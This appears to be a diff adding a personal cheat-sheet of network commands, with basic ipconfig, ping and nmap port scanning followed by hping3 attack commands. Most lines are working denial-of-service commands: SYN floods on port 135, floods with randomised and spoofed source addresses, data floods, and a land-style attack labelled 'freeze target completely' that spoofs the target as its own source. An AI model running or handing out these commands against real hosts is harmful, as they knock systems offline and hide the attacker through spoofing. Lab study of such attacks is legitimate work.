@@ -1,0 +1,40 @@
+//windows
+ipconfig
+ping 192.25.whatever
+
+//linux
+
+ifconfig
+ping other_machine_ip
+// find what ports are open on other machine=
+nmap other_machine_ip
+hping3 -help or man hping3
+
+hping3 --scan 1-65535 other_machine_ip
+hping3 --scan 1-65535 other_machine_ip -S --rand-source
+
+//flood syn attacks
+hping3 -S our_machine -a other machine -p 135 --flood
+
+to stop attack - ctrl+c
+
+hping3 -c 10000 -d 10000 -S -p 135 --flood --rand-source other_machine
+
+//send bytes to target_machine
+hping3 target-ip --data 100000
+
+//flood target
+hping3 -S -d 5000 --flood target-ip
+
+hping3 -S -d 5000 --flood target-ip
+
+//using rand-source
+hping3 target-ip --flood --rand-source data 10000
+
+//freeze target completely
+hping3 -S target-ip -a target-ip -k -s 135 -p 135 --flood
+
+
+
+
+
